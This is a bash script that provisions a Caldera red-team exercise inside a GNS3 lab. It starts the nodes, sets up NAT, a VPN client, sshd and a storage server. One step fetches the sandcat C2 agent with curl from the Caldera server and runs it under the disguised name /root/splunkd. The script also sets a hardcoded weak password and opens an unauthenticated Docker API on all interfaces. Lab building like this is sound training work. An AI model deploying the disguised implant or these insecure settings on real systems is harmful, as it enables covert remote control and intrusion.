#!/usr/bin/env bash
#
# Caldera lab setup — UK-Intergalactic on UK-Office
# --------------------------------------------------------------
# Re-establishes the red-team side of the exercise on a (possibly duplicated)
# UK-Office project: NAT for the inner bridge, hostname resolution, sandcat
# agent deployment on intergalactic-hacker, VPN-client + sshd provisioning
# on alpine-3.18-openvpn-1, and storage-server-1 setup (IP 192.168.138.2 + sshd).
#
# Discovers the project by name pattern (or accepts an explicit override) and
# resolves nodes' container IDs from it, so IDs don't need updating by
# hand every time the project is duplicated or restarted.
#
# Caldera itself (172.18.0.6:8888) is NOT a GNS3 node — it's a sibling
# container on the outer acs-ai-security-network. No discovery needed for it,
# it's a fixed address.

set -uo pipefail

# ---- Configuration ----
PROJECT_ID="${PROJECT_ID:-}"                                          # set explicitly to skip discovery
PROJECT_NAME_PATTERN="${PROJECT_NAME_PATTERN:-UK-Office}"
CALDERA_SERVER="http://172.18.0.6:8888"                               # confirmed real Caldera address
HACKER_NODE_NAME="intergalactic-hacker"                                # attacker foothold, gets the sandcat agent
VPN_GW_NODE_NAME="intergalactic-vpn"                                   # vulnerable web-UI VPN gateway
VPN_CLIENT_NODE_NAME="alpine-3.18-openvpn-1"                           # lateral-movement target
STORAGE_SERVER_NODE_NAME="storage-server-1"                           # internal VLAN target (192.168.138.2)

# ---- 1. Resolve project ID ----
if [ -z "$PROJECT_ID" ]; then
  echo "== No PROJECT_ID set — searching projects matching '$PROJECT_NAME_PATTERN' =="
  MATCHES=$(curl -s http://localhost:3080/v2/projects | python3 -c "
import json, sys
pat = '''$PROJECT_NAME_PATTERN'''
for p in json.load(sys.stdin):
    if pat in p.get('name',''):
        print(p.get('project_id'), '|', p.get('status'), '|', p.get('name'))
")
  MATCH_COUNT=$(echo "$MATCHES" | grep -c . || true)

  if [ "$MATCH_COUNT" -eq 0 ]; then
    echo "!! No project matched '$PROJECT_NAME_PATTERN'. Set PROJECT_ID explicitly and re-run:" >&2
    echo "   PROJECT_ID=<id> $0" >&2
    exit 1
  elif [ "$MATCH_COUNT" -eq 1 ]; then
    PROJECT_ID=$(echo "$MATCHES" | cut -d'|' -f1 | tr -d ' ')
    echo "   found: $MATCHES"
  else
    OPENED=$(echo "$MATCHES" | grep '| opened |' || true)
    OPENED_COUNT=$(echo "$OPENED" | grep -c . || true)
    if [ "$OPENED_COUNT" -eq 1 ]; then
      PROJECT_ID=$(echo "$OPENED" | cut -d'|' -f1 | tr -d ' ')
      echo "   multiple name matches, exactly one is 'opened' — using it:"
      echo "   $OPENED"
    else
      echo "!! Multiple candidate projects, can't pick automatically:" >&2
      echo "$MATCHES" >&2
      echo "   Set PROJECT_ID explicitly and re-run:" >&2
      echo "   PROJECT_ID=<id> $0" >&2
      exit 1
    fi
  fi
fi
echo "== Using project: $PROJECT_ID =="

# ---- Helper: resolve a node's node_id / status / container_id by name ----
resolve_node() {
  local NAME="$1"
  curl -s "http://localhost:3080/v2/projects/${PROJECT_ID}/nodes" | python3 -c "
import json, sys
name = '''$NAME'''
for n in json.load(sys.stdin):
    if n.get('name') == name:
        print(n.get('node_id',''), '|', n.get('status',''), '|', n.get('properties', {}).get('container_id',''))
"
}

# ---- Helper: start a node if it isn't already, given its info tuple ----
ensure_started() {
  local LABEL="$1" NODE_ID="$2" STATUS="$3"
  if [ "$STATUS" != "started" ]; then
    echo "== $LABEL not started — starting it =="
    curl -s -X POST "http://localhost:3080/v2/projects/${PROJECT_ID}/nodes/${NODE_ID}/start" > /dev/null
    sleep 5
  fi
}

# ---- 2. Resolve intergalactic-hacker ----
HACKER_INFO=$(resolve_node "$HACKER_NODE_NAME")
if [ -z "$HACKER_INFO" ]; then
  echo "!! No node named '$HACKER_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
HACKER_NODE_ID=$(echo "$HACKER_INFO" | cut -d'|' -f1 | tr -d ' ')
HACKER_STATUS=$(echo "$HACKER_INFO" | cut -d'|' -f2 | tr -d ' ')
HACKER_ID=$(echo "$HACKER_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== $HACKER_NODE_NAME: node_id=$HACKER_NODE_ID status=$HACKER_STATUS container_id=$HACKER_ID =="
ensure_started "$HACKER_NODE_NAME" "$HACKER_NODE_ID" "$HACKER_STATUS"

# ---- 2b. Resolve intergalactic-vpn (the gateway) ----
VPN_GW_INFO=$(resolve_node "$VPN_GW_NODE_NAME")
if [ -z "$VPN_GW_INFO" ]; then
  echo "!! No node named '$VPN_GW_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
VPN_GW_NODE_ID=$(echo "$VPN_GW_INFO" | cut -d'|' -f1 | tr -d ' ')
VPN_GW_STATUS=$(echo "$VPN_GW_INFO" | cut -d'|' -f2 | tr -d ' ')
VPN_GW_ID=$(echo "$VPN_GW_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== $VPN_GW_NODE_NAME: node_id=$VPN_GW_NODE_ID status=$VPN_GW_STATUS container_id=$VPN_GW_ID =="
ensure_started "$VPN_GW_NODE_NAME" "$VPN_GW_NODE_ID" "$VPN_GW_STATUS"

# ---- 2c. Resolve alpine-3.18-openvpn-1 (the lateral-movement target) ----
VPN_CLIENT_INFO=$(resolve_node "$VPN_CLIENT_NODE_NAME")
if [ -z "$VPN_CLIENT_INFO" ]; then
  echo "!! No node named '$VPN_CLIENT_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
VPN_CLIENT_NODE_ID=$(echo "$VPN_CLIENT_INFO" | cut -d'|' -f1 | tr -d ' ')
VPN_CLIENT_STATUS=$(echo "$VPN_CLIENT_INFO" | cut -d'|' -f2 | tr -d ' ')
VPN_CLIENT_ID=$(echo "$VPN_CLIENT_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== $VPN_CLIENT_NODE_NAME: node_id=$VPN_CLIENT_NODE_ID status=$VPN_CLIENT_STATUS container_id=$VPN_CLIENT_ID =="
ensure_started "$VPN_CLIENT_NODE_NAME" "$VPN_CLIENT_NODE_ID" "$VPN_CLIENT_STATUS"

# ---- 2d. Resolve storage-server-1 ----
STORAGE_INFO=$(resolve_node "$STORAGE_SERVER_NODE_NAME")
if [ -z "$STORAGE_INFO" ]; then
  echo "!! No node named '$STORAGE_SERVER_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
STORAGE_NODE_ID=$(echo "$STORAGE_INFO" | cut -d'|' -f1 | tr -d ' ')
STORAGE_STATUS=$(echo "$STORAGE_INFO" | cut -d'|' -f2 | tr -d ' ')
STORAGE_ID=$(echo "$STORAGE_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== $STORAGE_SERVER_NODE_NAME: node_id=$STORAGE_NODE_ID status=$STORAGE_STATUS container_id=$STORAGE_ID =="
ensure_started "$STORAGE_SERVER_NODE_NAME" "$STORAGE_NODE_ID" "$STORAGE_STATUS"

# ---- 3. Inner Docker daemon (DinD) is up — check, and start it if not ----
echo "== Checking inner dockerd inside gns3-server =="
if docker exec gns3-server sh -c 'docker version' >/dev/null 2>&1; then
  echo "   ok — dockerd is running and responsive"
else
  echo "   not responsive — attempting to start it"
  docker exec gns3-server sh -c 'rm -f /var/run/docker.pid'
  docker exec gns3-server sh -c 'nohup dockerd --host=tcp://0.0.0.0:2375 --host=unix:///var/run/docker.sock > /var/log/dockerd.log 2>&1 &'

  READY=0
  for i in 1 2 3 4 5 6 7 8 9 10; do
    sleep 2
    if docker exec gns3-server sh -c 'docker version' >/dev/null 2>&1; then
      READY=1
      break
    fi
  done

  if [ "$READY" -eq 1 ]; then
    echo "   started successfully after ~$((i * 2))s"
  else
    echo "!! could not get dockerd responsive after 20s." >&2
    exit 1
  fi
fi

# ---- 4. NAT for the inner bridge (idempotent) ----
echo "== Checking MASQUERADE rule for 172.100.1.0/24 =="
if docker exec gns3-server sh -c "iptables -t nat -L -n -v" | grep -q "172.100.1.0"; then
  echo "   already present, skipping"
else
  docker exec gns3-server sh -c "iptables -t nat -A POSTROUTING -s 172.100.1.0/24 -o eth0 -j MASQUERADE"
  echo "   added"
fi

# ---- 5. Confirm intergalactic-hacker IPv4 ----
echo "== Checking $HACKER_NODE_NAME's IPv4 address =="
HACKER_IP=$(docker exec gns3-server sh -c "docker exec $HACKER_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+' || true)
if [ -z "$HACKER_IP" ]; then
  echo "   no IPv4 yet — requesting DHCP lease"
  docker exec gns3-server sh -c "docker exec $HACKER_ID udhcpc -i eth0"
  HACKER_IP=$(docker exec gns3-server sh -c "docker exec $HACKER_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+' || true)
fi
echo "   $HACKER_NODE_NAME IP: $HACKER_IP"

# ---- 5b. Check intergalactic-vpn IPv4 ----
echo "== Checking $VPN_GW_NODE_NAME's IPv4 address =="
VPN_GW_IP=$(docker exec gns3-server sh -c "docker exec $VPN_GW_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+' || true)
if [ -z "$VPN_GW_IP" ]; then
  echo "   no IPv4 yet — requesting DHCP lease"
  docker exec gns3-server sh -c "docker exec $VPN_GW_ID udhcpc -i eth0"
  VPN_GW_IP=$(docker exec gns3-server sh -c "docker exec $VPN_GW_ID ip -4 addr show eth0" | grep -oP 'inet \K[0-9.]+' || true)
fi
echo "   $VPN_GW_NODE_NAME IP: $VPN_GW_IP"

# ---- 6. Confirm reachability to Caldera ----
echo "== Checking reachability to Caldera ($CALDERA_SERVER) from $HACKER_NODE_NAME =="
HTTP_CODE=$(docker exec gns3-server sh -c "docker exec $HACKER_ID curl -s -o /dev/null -w '%{http_code}' --max-time 5 $CALDERA_SERVER")
if [ "$HTTP_CODE" != "200" ]; then
  echo "!! Caldera not reachable from $HACKER_NODE_NAME (got HTTP $HTTP_CODE)." >&2
  exit 1
fi
echo "   reachable (HTTP 200)"

# ---- 7. Hostname resolution on intergalactic-hacker ----
echo "== Ensuring /etc/hosts entries on $HACKER_NODE_NAME =="
for ENTRY in \
  "$VPN_GW_IP intergalactic-vpn-gw.cyber-twin" \
  "$VPN_GW_IP intergalactic-vpn-1.cyber-twin" \
  "172.18.0.6 caldera.cyber-twin"
do
  HOSTNAME_PART=$(echo "$ENTRY" | awk '{print $2}')
  if docker exec gns3-server sh -c "docker exec $HACKER_ID cat /etc/hosts" | grep -q "$HOSTNAME_PART"; then
    echo "   $HOSTNAME_PART already present, skipping"
  else
    docker exec gns3-server sh -c "docker exec $HACKER_ID sh -c 'echo $ENTRY >> /etc/hosts'"
    echo "   added: $ENTRY"
  fi
done

# ---- 8. Deploy the sandcat agent on intergalactic-hacker ----
echo "== Checking for an existing agent process on $HACKER_NODE_NAME =="
EXISTING_PID=$(docker exec gns3-server sh -c "docker exec $HACKER_ID sh -c 'pgrep -f /root/splunkd'" 2>/dev/null || true)
if [ -n "$EXISTING_PID" ]; then
  echo "   agent already running (pid $EXISTING_PID) — skipping deploy."
else
  echo "== Deploying sandcat agent =="
  docker exec gns3-server sh -c "docker exec $HACKER_ID sh -c '
server=$CALDERA_SERVER
curl -s -X POST -H file:sandcat.go -H platform:linux \$server/file/download > /root/splunkd
chmod +x /root/splunkd
nohup /root/splunkd -server \$server -group red -v > /root/splunkd.log 2>&1 &
'"
  sleep 3
  echo "== Verifying beaconing =="
  docker exec gns3-server sh -c "docker exec $HACKER_ID tail -20 /root/splunkd.log"
fi

# ---- 9. Provision alpine-3.18-openvpn-1 as a VPN client ----
echo "== Checking whether $VPN_CLIENT_NODE_NAME already has an active VPN tunnel =="
TUN0_IP=$(docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID ip -4 addr show tun0" 2>/dev/null | grep -oP 'inet \K[0-9.]+' || true)
if [ -n "$TUN0_IP" ]; then
  echo "   tun0 already up ($TUN0_IP) — skipping cert generation"
else
  echo "== Generating VPN client cert for $VPN_CLIENT_NODE_NAME on the gateway =="
  docker exec gns3-server sh -c "docker exec $VPN_GW_ID bash /app/web_ui/add_client.sh $VPN_GW_IP alpine-openvpn-1 > /tmp/alpine-openvpn-1.ovpn"

  echo "== Copying client config onto $VPN_CLIENT_NODE_NAME =="
  docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID mkdir -p /etc/openvpn/client"
  docker exec gns3-server docker cp /tmp/alpine-openvpn-1.ovpn "$VPN_CLIENT_ID:/etc/openvpn/client/client.ovpn"

  echo "== Starting OpenVPN client =="
  docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID sh -c 'nohup openvpn --config /etc/openvpn/client/client.ovpn --daemon'"

  echo "== Waiting for tun0 to come up =="
  TUN0_IP=""
  for i in 1 2 3 4 5 6 7 8 9 10; do
    sleep 2
    TUN0_IP=$(docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID ip -4 addr show tun0" 2>/dev/null | grep -oP 'inet \K[0-9.]+' || true)
    [ -n "$TUN0_IP" ] && break
  done
  if [ -z "$TUN0_IP" ]; then
    echo "!! tun0 never came up after ~20s." >&2
    exit 1
  fi
  echo "   tun0 up: $TUN0_IP"
fi

# ---- 10. Fix and start sshd on alpine-3.18-openvpn-1 ----
echo "== Checking sshd on $VPN_CLIENT_NODE_NAME =="
if docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID sh -c 'pgrep sshd'" >/dev/null 2>&1; then
  echo "   sshd already running, skipping"
else
  docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID sh -c 'chown root:root /var/empty && chmod 755 /var/empty'"
  docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID sh -c '/usr/sbin/sshd'"
fi

# ---- 11. Provision storage-server-1 (IP: 192.168.138.2, User: alice-backup, sshd) ----
echo "== Configuring IP 192.168.138.2 on $STORAGE_SERVER_NODE_NAME =="
docker exec gns3-server sh -c "docker exec $STORAGE_ID ip addr replace 192.168.138.2/24 dev eth0"

echo "== Provisioning user 'alice-backup' and starting sshd on $STORAGE_SERVER_NODE_NAME =="
docker exec gns3-server sh -c "docker exec $STORAGE_ID sh -c '
  id -u alice-backup >/dev/null 2>&1 || adduser -D -h /home/alice-backup -s /bin/sh alice-backup
  echo \"alice-backup:wonderland\" | chpasswd
  mkdir -p /home/alice-backup
  touch /home/alice-backup/backup-flag.txt
  chown -R alice-backup:alice-backup /home/alice-backup
  
  if [ -d /var/empty ]; then
    chown root:root /var/empty
    chmod 755 /var/empty
  fi
  
  ssh-keygen -A 2>/dev/null || true
  pgrep sshd >/dev/null || /usr/sbin/sshd
'"

# ---- 12. Clear stale processes on hacker node ----
echo "== Clearing stale processes on $HACKER_NODE_NAME =="
docker exec gns3-server sh -c "docker exec $HACKER_ID sh -c 'pkill -9 openvpn 2>/dev/null; pkill -9 ssh 2>/dev/null; true'"

echo ""
echo "== Verification =="
docker exec gns3-server sh -c "docker exec $HACKER_ID ps aux | grep '[s]plunkd'"
docker exec gns3-server sh -c "docker exec $VPN_CLIENT_ID sh -c 'ip -4 addr show tun0; pgrep sshd'"
docker exec gns3-server sh -c "docker exec $STORAGE_ID sh -c 'ip -4 addr show eth0; pgrep sshd'"

echo ""
echo "== Done. Project $PROJECT_ID is ready for UK-Intergalactic. =="